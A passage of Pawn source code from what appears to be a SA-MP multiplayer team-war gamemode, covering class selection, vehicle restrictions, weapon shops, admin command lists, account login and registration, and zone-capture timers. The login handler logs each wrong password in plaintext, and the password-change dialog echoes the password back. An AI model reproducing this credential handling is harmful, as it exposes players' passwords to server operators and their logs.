    if(pickupid == PP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
    if(pickupid == IP && GetPlayerTeam(playerid) != TEAM_INDIA) return SendClientMessage(playerid, 0xFF0000AA, "Only India team can use this briefcase.");
	{
    if(pickupid == IP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
    if(pickupid == NP && GetPlayerTeam(playerid) != TEAM_NEPAL) return SendClientMessage(playerid, 0xFF0000AA, "Only Nepal team can use this briefcase.");
	{
    if(pickupid == NP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
    if(pickupid == UP && GetPlayerTeam(playerid) != TEAM_USA) return SendClientMessage(playerid, 0xFF0000AA, "Only USA team can use this briefcase.");
	{
    if(pickupid == UP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
    if(pickupid == DP && GetPlayerTeam(playerid) != TEAM_DUBAI) return SendClientMessage(playerid, 0xFF0000AA, "Only Dubai team can use this briefcase.");
	{
    if(pickupid == DP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
    if(pickupid == MP && GetPlayerTeam(playerid) != TEAM_ML) return SendClientMessage(playerid, 0xFF0000AA, "Only Malaysia team can use this briefcase.");
	{
    if(pickupid == MP) ShowPlayerDialog(playerid, 2, DIALOG_STYLE_LIST, "Briefcase", "Health - 5000$\nArmour 5500$\n\nWeapons\nDeathmatch stadium", "Buy", "Cancel");
    }
	return 1;
}

public OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][SpecID] != INVALID_PLAYER_ID)
	{
		if(newkeys == KEY_JUMP) AdvanceSpectate(playerid);
		else if(newkeys == KEY_SPRINT) ReverseSpectate(playerid);
		else if(newkeys == KEY_FIRE) StopSpectate(playerid);
    }
	new Rhinomodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != ENGINEER) {
		if(Rhinomodel == 432) {
			SendClientMessage(playerid, red, "ERROR: You need to be Engineer to drive tanks!");
			RemovePlayerFromVehicle(playerid);
		}
	}
	new SEA = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != PILOT) {
		if(SEA == 447) {
			SendClientMessage(playerid, red, "ERROR: You need to be Pilot to drive Sea Sparrows!");
			RemovePlayerFromVehicle(playerid);
		}
    }
	new SEASPARROW = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != SCOUT) {
		if(SEASPARROW == 447) {
			SendClientMessage(playerid, red, "ERROR: You need to be Scout to drive Sea Sparrows!");
			RemovePlayerFromVehicle(playerid);
		}
    }
	new Hydramodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != PILOT) {
		if(Hydramodel == 520) {
			SendClientMessage(playerid, red, "ERROR: You need to be Pilot to drive Hydras!");
			RemovePlayerFromVehicle(playerid);
	 	}
	}
	new Huntermodel = GetVehicleModel(GetPlayerVehicleID(playerid));
	if (gClass[playerid] != PILOT) {
		if(Huntermodel == 425) {
			SendClientMessage(playerid, red, "ERROR: You need to be Pilot to drive Hunters!");
			RemovePlayerFromVehicle(playerid);
		}
	}
	return 1;
}


stock GetRankName(playerid)
{
	new str3[64];
	if (GetPlayerScore(playerid) >= 0 && GetPlayerScore(playerid) <= 99) str3 = ("Corporal");
	if (GetPlayerScore(playerid) >= 100 && GetPlayerScore(playerid) <= 299) str3 = ("Lieutenant");
	if (GetPlayerScore(playerid) >= 300 && GetPlayerScore(playerid) <= 499) str3 = ("Major");
	if (GetPlayerScore(playerid) >= 500 && GetPlayerScore(playerid) <= 999) str3 = ("Captain");
	if (GetPlayerScore(playerid) >= 1000 && GetPlayerScore(playerid) <= 1499) str3 = ("Commander");
	if (GetPlayerScore(playerid) >= 1500 && GetPlayerScore(playerid) <= 1999) str3 = ("General");
	if (GetPlayerScore(playerid) >= 2000 && GetPlayerScore(playerid) <= 2499) str3 = ("Brigadier");
	if (GetPlayerScore(playerid) >= 2500 && GetPlayerScore(playerid) <= 4999) str3 = ("Field Marshall");
	if (GetPlayerScore(playerid) >= 5000 && GetPlayerScore(playerid) <= 9999) str3 = ("Master Of Wars");
	if (GetPlayerScore(playerid) >= 10000) str3 = ("General of Army");
	return str3;
}
stock GetClass(playerid)
{
	new str[64];
	if(gClass[playerid] == SOLDIER) str = ("Soldier");
	else if(gClass[playerid] == SNIPER) str = ("Sniper");
	else if(gClass[playerid] == ENGINEER) str = ("Engineer");
	else if(gClass[playerid] == PILOT) str = ("Pilot");
	else if(gClass[playerid] == SUPPORT) str = ("Support");
	else if(gClass[playerid] == SUPPORT) str = ("Scout");
	return str;
}

public OnPlayerStreamIn(playerid, forplayerid)
{
	return 1;
}

public OnPlayerStreamOut(playerid, forplayerid)
{
	return 1;
}

public OnVehicleStreamIn(vehicleid, forplayerid)
{
	return 1;
}

public OnVehicleStreamOut(vehicleid, forplayerid)
{
	return 1;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
if(strfind(inputtext,"%",true) != -1) return SendClientMessage(playerid, RED," ");
if(dialogid == CLASS_DIALOG)
{
   if(!response)
   {
	   SendClientMessage(playerid, red,"You have to choose the class!");
    ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
   }
   else if(response)
   {
	   switch(listitem)
	   {
		   case 0:
		   {
			   gClass[playerid] = SOLDIER;
			   SendClientMessage(playerid, -1,"You have chosen the SOLDIER class");
			   SendClientMessage(playerid, -1,"BONUS: No extra bonus with this class");
			   UpdateLabelText(playerid);
		   }
		   case 1:
		   {
			  	if(GetPlayerScore(playerid) >= 99)
			  	{
				   gClass[playerid] = SNIPER;
				   SendClientMessage(playerid, -1,"You have chosen the Sniper class");
				   SendClientMessage(playerid, -1,"BONUS: Invisible on map");
				   UpdateLabelText(playerid);
				}
				else
				{
        ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
                   SendClientMessage(playerid, red,"You need to have rank 2 to use this class!");
				}
		   }
		   case 2:
		   {
                if(GetPlayerScore(playerid) >= 1500)
                {
				   gClass[playerid] = PILOT;
				   SendClientMessage(playerid, -1,"You have chosen Pilot class");
				   SendClientMessage(playerid, -1,"BONUS: Can fly heavy air vehicles");
				   UpdateLabelText(playerid);
				}
				else
				{
        ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
                   SendClientMessage(playerid, red,"You need to have rank 6 to use this class!");
				}

		   }
		   case 3:
		   {
                if(GetPlayerScore(playerid) >= 1000)
                {
				   gClass[playerid] = ENGINEER;
				   SendClientMessage(playerid, -1,"You have chosen Engineer class");
				   SendClientMessage(playerid, -1,"BONUS: Can drive rhino at particular rank");
				   UpdateLabelText(playerid);
				}
				else
				{
        ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
                   SendClientMessage(playerid, red,"You need to have rank 5 to use this class!");
				}
		   }
		   case 4:
		   {
                if(GetPlayerScore(playerid) >= 2000)
                {
				   gClass[playerid] = SUPPORT;
				   SendClientMessage(playerid, -1,"You have chosen Support class");
				   SendClientMessage(playerid, -1,"BONUS: No Bonus");
				   UpdateLabelText(playerid);
				}
				else
				{
        ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
                   SendClientMessage(playerid, red,"You need to have rank 7 to use this class!");
				}
		   }
		   case 5:
		   {
                if(GetPlayerScore(playerid) >= 1000)
                {
				   gClass[playerid] = SUPPORT;
				   SendClientMessage(playerid, -1,"You have chosen Scout class");
				   SendClientMessage(playerid, -1,"BONUS:Can Drive Sea Sparrow");
				   UpdateLabelText(playerid);
				}
				else
				{
        ShowPlayerDialog(playerid, CLASS_DIALOG, DIALOG_STYLE_LIST,"Class Selection",""cred"Soldier - "cgreen"Rank 0\n"cred"Sniper - "cgreen"Rank 2\n"cred"Pilot - "cgreen"Rank 6\n"cred"Engineer - "cgreen"Rank 5\n"cred"Support - "cgreen"Rank 7\n"cred"Scout - "cgreen"Rank 5","Select","");
                   SendClientMessage(playerid, red,"You need to have rank 5 to use this class!");
				}
		   }
	   }
   }
}
switch(dialogid) // Lookup the dialogid
{
        case 245:
        {
            if(!response)
            {
                SendClientMessage(playerid, red,"You Canceled!");
                return 1; // We processed it
            }
             switch(listitem) // This is far more efficient than using an if-elseif-else structure
             {
                case 0:
                {
                  ChangeVehicleColor(GetPlayerVehicleID(playerid), 1, 1);
        	    }
        	    case 1:
        	    {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 236, 236);
                }
                case 2:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 79, 79);
                }
                case 3:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 6, 6);
                }
                case 4:
				{
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 55, 55);
                }
                case 5:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 147, 147);
                }
                case 6:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 3, 3);
                }
                case 7:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 183, 183);
                }
                case 8:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 186, 186);
                }
                case 9:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 91, 91);
                }
                case 10:
                {
                    ChangeVehicleColor(GetPlayerVehicleID(playerid), 000, 000);
                }
              }
         }
         case 786:
        {
            if(!response)
            {
                SendClientMessage(playerid, red,"You Canceled!");
                return 1; // We processed it
            }
             switch(listitem) // This is far more efficient than using an if-elseif-else structure
             {
                case 0:
                {
 if(PlayerInfo[playerid][Level] >= 1)
	{
		SendClientMessage(playerid,blue,"    ---=Level 1 Admin Commands =---");
SendClientMessage(playerid,lightblue," FLIP, FIX, REPAIR, LP, CARCOLOUR, LTUNE, SETMYTIME, TIME, GETID, LINKCAR, LNOS, LHY");
			}
	return 1;
}

        	    case 1:
        	    {
	if(PlayerInfo[playerid][Level] >= 2)
	{
		SendClientMessage(playerid,blue,"    ---=Level 2 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"giveweapon, setcolour, lockcar, unlockcar, burn, spawn, disarm, lcar, lbike,");
		SendClientMessage(playerid,lightblue,"lheli, lboat, lplane, hightlight, announce, announce2, screen, jetpack, flip,");
		SendClientMessage(playerid,lightblue,"goto, vgoto, lgoto, fu, kick, warn, slap, jailed, frozen, mute, unmute, muted,");
		SendClientMessage(playerid,lightblue,"laston, ls, lsof, lsv, clearchat, lmenu, ltele, cm, ltmenu,");
		SendClientMessage(playerid,lightblue,"write,explode,burn,async,ban");
	}
	return 1;
}

                case 2:
                {
	if(PlayerInfo[playerid][Level] >= 3)
	{
		SendClientMessage(playerid,blue,"    ---=Level 3 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"sethealth, setarmour, setcash, setskin, setwanted, setweather,");
		SendClientMessage(playerid,lightblue,"settime, setworld, setinterior, force, eject, bankrupt, sbankrupt, ubound, lweaps,");
		SendClientMessage(playerid,lightblue,"lammo, countdown, duel, car, carhealth, carcolour, setping, setgravity, destroycar,");
		SendClientMessage(playerid,lightblue,"teleplayer, vget, givecar, gethere, get, jail, unjail, freeze, ");
		SendClientMessage(playerid,lightblue,"unfreeze, akill,aka, disablechat, ban, clearallchat, caps, move, moveplayer, healall,");
		SendClientMessage(playerid,lightblue,"setallweather, setalltime, setallworld, unfreezeall");
		SendClientMessage(playerid,lightblue,"lweather, ltime, lweapons, setpass,changename");
	}
	return 1;
}
                case 3:
                {
	if(PlayerInfo[playerid][Level] >= 4)
	{
		SendClientMessage(playerid,blue,"    ---=Level 4 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"enable, disable, ban, rban, crash, spam, god, godcar, die, uconfig,");
		SendClientMessage(playerid,lightblue,"botcheck, lockserver, unlockserver, forbidname, forbidword, ");
		SendClientMessage(playerid,lightblue,"fakedeath, spawnall, muteall, unmuteall, getall, killall, freezeall, Giveallweapon, Armourall, GiveAllcash.");
		SendClientMessage(playerid,lightblue,"kickall, slapalll, explodeall, disarmall, ejectall, SetAllcash, Setallscore");
		SendClientMessage(playerid,lightblue,",setname, rv");
	}
	return 1;
}

                case 4:
				{
		if(PlayerInfo[playerid][Level] >= 5)
	{
		SendClientMessage(playerid,blue,"    ---=Level 5 Admin Commands =---");
		SendClientMessage(playerid,lightblue,"god, sgod, pickup, object, fakechat, setallscore.");
		SendClientMessage(playerid,lightblue,"setmoderator, unsetmoderator, setlevel, settemplevel , setkills, setdeaths");
	}
	return 1;
}
      case 5:
				{
				if(PlayerInfo[playerid][Level] >= 6)
	{
		SendClientMessage(playerid,blue,"    ---=Level 6 Admin Commands =---");
		SendClientMessage(playerid,lightblue," ");
	}
	return 1;
}
              }
         }
		case 125:
		{
		   if(!response)
		   {
                Kick(playerid);
           }
		   if (udb_Exists(PlayerName2(playerid))) {
              if (udb_CheckLogin(PlayerName2(playerid),inputtext))
	          {
		       new file[256], tmp3[100], string[128];
	   	       format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(PlayerName2(playerid)) );
   		       GetPlayerIp(playerid,tmp3,100);
	   	       dini_Set(file,"ip",tmp3);
		       LoginPlayer(playerid);
		       SendClientMessage(playerid,0xFFFF00C8,"We Own It");
	           PlayAudioStreamForPlayer(playerid,"http://a.tumblr.com/tumblr_mmx0g4qjU81qil8omo1.mp3");
		       PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		       if(PlayerInfo[playerid][Level] > 0) {
			       format(string,sizeof(string),"ACCOUNT: Successfully Logged In. (Level %d)", PlayerInfo[playerid][Level] );
			       return SendClientMessage(playerid,green,string);
       	       } else return SendClientMessage(playerid,green,"ACCOUNT: Successfully Logged In");
	       }
	       else {
		       PlayerInfo[playerid][FailLogin]++;
		       printf("LOGIN: %s has failed to login, Wrong password (%s) Attempt (%d)", PlayerName2(playerid),inputtext, PlayerInfo[playerid][FailLogin] );
		       if(PlayerInfo[playerid][FailLogin] == MAX_FAIL_LOGINS)
		       {
			       new string[128]; format(string, sizeof(string), "%s has been kicked (Failed Logins)", PlayerName2(playerid) );
			       SendClientMessageToAll(red, string);
			       print(string);
			       Kick(playerid);
		           }
		      }
		}
		new string[200];
	    format(string, sizeof(string),""cwhite"Welcome "cred"%s "cwhite"you are already registered\nKindly enter password to login to your account\n"cred"Incorrect password!", PlayerName2(playerid));
		ShowPlayerDialog(playerid, 125, DIALOG_STYLE_INPUT, "Login",string,"Login","Kick");
	}
	case 126:
	{
       if(!response)
       {
         Kick(playerid);
       }
      if (strlen(inputtext) < 4 || strlen(inputtext) > 20) {
      	new string[200];
	  	format(string, sizeof(string),""cwhite"Welcome "cred"%s "cwhite"you are not registered\nKindly enter password to register your account\n"cred"Invalid password length", PlayerName2(playerid));
	   ShowPlayerDialog(playerid, 126, DIALOG_STYLE_INPUT, "Register",string,"Register","Kick");
	  }
      if (!udb_Exists(PlayerName2(playerid))) {
      if (udb_Create(PlayerName2(playerid),inputtext))
	  {
    	new file[256],name[MAX_PLAYER_NAME], tmp3[100];
    	new strdate[20], year,month,day;	getdate(year, month, day);
		GetPlayerName(playerid,name,sizeof(name)); format(file,sizeof(file),"/ladmin/users/%s.sav",udb_encode(name));
     	GetPlayerIp(playerid,tmp3,100);	dini_Set(file,"ip",tmp3);
//    	dini_Set(file,"password",params);
	    dUserSetINT(PlayerName2(playerid)).("registered",1);
   		format(strdate, sizeof(strdate), "%d/%d/%d",day,month,year);
		dini_Set(file,"RegisteredDate",strdate);
		dUserSetINT(PlayerName2(playerid)).("loggedin",1);
		dUserSetINT(PlayerName2(playerid)).("banned",0);
		dUserSetINT(PlayerName2(playerid)).("level",0);
	    dUserSetINT(PlayerName2(playerid)).("LastOn",0);
    	dUserSetINT(PlayerName2(playerid)).("money",0);
		dUserSetINT(PlayerName2(playerid)).("Score",0);
    	dUserSetINT(PlayerName2(playerid)).("kills",0);
	   	dUserSetINT(PlayerName2(playerid)).("deaths",0);
	   	dUserSetINT(PlayerName2(playerid)).("hours",0);
	   	dUserSetINT(PlayerName2(playerid)).("minutes",0);
	   	dUserSetINT(PlayerName2(playerid)).("seconds",0);
	   	dUserSetINT(PlayerName2(playerid)).("dRank",0);
	    PlayerInfo[playerid][LoggedIn] = 1;
	    PlayerInfo[playerid][Registered] = 1;
	    SendClientMessage(playerid,0xFFFF00C8,"We Own It Wiz Khalifa");
      PlayAudioStreamForPlayer(playerid,"http://a.tumblr.com/tumblr_mmx0g4qjU81qil8omo1.mp3");
	    SendClientMessage(playerid, green, "ACCOUNT: You are now registered, and have been automaticaly logged in");
		PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
	  }
	 }
    }
    case 183:
	{
        if(!response)
	    {
          ShowPlayerDialog(ID[playerid],183,DIALOG_STYLE_INPUT,"Password After changing Name","You Must Added New Password For Your New Name\n{FF0000}Or Your account will Lost!","Set","");
        }
        new string[128];
		dUserSetINT(PlayerName2(ID[playerid])).("password_hash",udb_hash(inputtext) );
		PlayerPlaySound(ID[playerid],1057,0.0,0.0,0.0);
        format(string, sizeof(string),"ACCOUNT: You have successfully changed your password to \"%s\"",inputtext);
	    SendClientMessage(ID[playerid],yellow,string);
	   }
	}
if(response)
    {
    switch(dialogid)
        {
		case 2:
    	    {
           	switch(listitem)
        	{
        	    case 0:
        	    {
                 	if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -5000);
        	        SetPlayerHealth(playerid, 100.0);
					SendClientMessage(playerid, 0xFFFFFF, "You bought Health");
					}
        	    case 1:
        	    {
                    if(GetPlayerMoney(playerid) < 5500) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -5500);
        	        SetPlayerArmour(playerid, 100.0);
                     SendClientMessage(playerid, 0xFFFFFF, "You bought Armour");
        	    }
        	    case 2:
        	    {
        	        ShowPlayerDialog(playerid, 30, DIALOG_STYLE_LIST, "Weapons", "M4 - 8000$\nAK47 - 8000$\nMP5 - 6000$\nUZI - 12000$\nCombat Shotgun - 10000$\nShotgun - 5000$\nDesert Eagle - 6000$\nSilent Pistol - 3000$\nPistol - 3000$", "Buy", "Exit");
 	 			}
        	    case 3:
        	    {
				   if(AntiSK[playerid] == 0)
				   {
						SetPlayerTeam(playerid, -1);
	        	        SetPlayerSkin(playerid, 28);
	        	        SetPlayerHealth(playerid, 100);
	        	        SetPlayerArmour(playerid, 100);
	        	        SetPlayerColor(playerid, 0xFFFFFFFF);
	        	        SetPlayerPos(playerid, -1398.103515, 937.631164, 1036.479125);
	        	        SetPlayerInterior(playerid, 15);
						ResetPlayerWeapons(playerid);
						GivePlayerWeapon(playerid, 24, 500);
						GivePlayerWeapon(playerid, 27, 500);
						GivePlayerWeapon(playerid, 31, 500);
						GivePlayerWeapon(playerid, 16, 1);
						GivePlayerWeapon(playerid, 10, 1);
						new name[MAX_PLAYER_NAME];
						GetPlayerName(playerid, name, sizeof(name));
						new string[128];
						format(string, sizeof(string), "%s has joined Deathmatch area!", name);
	    				SendClientMessageToAll(red, string);
	    			}
	    			else return SendClientMessage(playerid, RED,"You cannot join DM while in AntiSK protection! Try again later");
           	 	}
        	}
    	    }
	}
    }
if(response)
    {
    switch(dialogid)
        {
		case 30:
    	    {
           	switch(listitem)
        	{
        	    case 0:
        	    {
                 	if(GetPlayerMoney(playerid) < 8000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -8000);
        	        GivePlayerWeapon(playerid, 31, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought M4");
        	    }
        	    case 1:
        	    {
                 	if(GetPlayerMoney(playerid) < 8000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -8000);
        	        GivePlayerWeapon(playerid, 30, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought AK 47");
        	    }
        	    case 2:
        	    {
                 	if(GetPlayerMoney(playerid) < 6000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -6000);
        	        GivePlayerWeapon(playerid, 29, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought MP5");
        	    }
        	    case 3:
        	    {
                 	if(GetPlayerMoney(playerid) < 12000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -12000);
        	        GivePlayerWeapon(playerid, 28, 500);
					SendClientMessage(playerid, 0xFFFFFF, "You bought UZI");
        	    }
        	    case 4:
        	    {
                 	if(GetPlayerMoney(playerid) < 10000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -10000);
        	        GivePlayerWeapon(playerid, 27, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought Combat Shotgun");
        	    }
        	    case 5:
        	    {
                 	if(GetPlayerMoney(playerid) < 5000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -5000);
        	        GivePlayerWeapon(playerid, 25, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought Shotgun");
        	    }
        	    case 6:
        	    {
                 	if(GetPlayerMoney(playerid) < 6000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -6000);
        	        GivePlayerWeapon(playerid, 24, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought Desert Eagle");
        	    }
        	    case 7:
        	    {
                 	if(GetPlayerMoney(playerid) < 3000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -3000);
        	        GivePlayerWeapon(playerid, 23, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought Silencer");
        	    }
        	    case 8:
        	    {
                 	if(GetPlayerMoney(playerid) < 3000) return SendClientMessage(playerid, 0xFF0000AA, "ERROR: You don't have enough cash.");
        	        GivePlayerMoney(playerid, -3000);
        	        GivePlayerWeapon(playerid, 22, 300);
					SendClientMessage(playerid, 0xFFFFFF, "You bought Pistol");
        	    }
        	}
    	    }
	}
    }
	return 1;
}
forward CountDown();
public CountDown()
{
	foreach(Player, playerid)
	{
		if(IsPlayerInDynamicCP(playerid, CP[SNAKE]) && UnderAttack[SNAKE] == 1 && IsPlayerCapturing[playerid][SNAKE] == 1)
		{
			CountVar[playerid][SNAKE]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][SNAKE]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BAY]) && UnderAttack[BAY] == 1 && IsPlayerCapturing[playerid][BAY] == 1)
		{
			CountVar[playerid][BAY]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][BAY]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[BIG]) && UnderAttack[BIG] == 1 && IsPlayerCapturing[playerid][BIG] == 1)
		{
			CountVar[playerid][BIG]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][BIG]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[ARMY]) && UnderAttack[ARMY] == 1 && IsPlayerCapturing[playerid][ARMY] == 1)
		{
			CountVar[playerid][ARMY]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][ARMY]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[PETROL]) && UnderAttack[PETROL] == 1 && IsPlayerCapturing[playerid][PETROL] == 1)
		{
			CountVar[playerid][PETROL]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][PETROL]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[OIL]) && UnderAttack[OIL] == 1 && IsPlayerCapturing[playerid][OIL] == 1)
		{
			CountVar[playerid][OIL]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][OIL]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[DESERT]) && UnderAttack[DESERT] == 1 && IsPlayerCapturing[playerid][DESERT] == 1)
		{
			CountVar[playerid][DESERT]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][DESERT]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[QUARRY]) && UnderAttack[QUARRY] == 1 && IsPlayerCapturing[playerid][QUARRY] == 1)
		{
			CountVar[playerid][QUARRY]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][QUARRY]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[GUEST]) && UnderAttack[GUEST] == 1 && IsPlayerCapturing[playerid][GUEST] == 1)
		{
			CountVar[playerid][GUEST]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][GUEST]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[EAR]) && UnderAttack[EAR] == 1 && IsPlayerCapturing[playerid][EAR] == 1)
		{
			CountVar[playerid][EAR]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][EAR]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[AIRPORT]) && UnderAttack[AIRPORT] == 1 && IsPlayerCapturing[playerid][AIRPORT] == 1)
		{
			CountVar[playerid][AIRPORT]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][AIRPORT]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[SHIP]) && UnderAttack[SHIP] == 1 && IsPlayerCapturing[playerid][SHIP] == 1)
		{
			CountVar[playerid][SHIP]--;
			new str1[124];
			TextDrawShowForPlayer(playerid, CountText[playerid]);
			format(str1, sizeof(str1),"~r~%d/~y~25 ~w~SECONDS ~g~REMAINING", CountVar[playerid][SHIP]);
			TextDrawSetString(CountText[playerid], str1);
		}
		if(IsPlayerInDynamicCP(playerid, CP[GAS]) && UnderAttack[GAS] == 1 && IsPlayerCapturing[playerid][GAS] == 1)
		{
			CountVar[playerid][GAS]--;
			new str1[124];
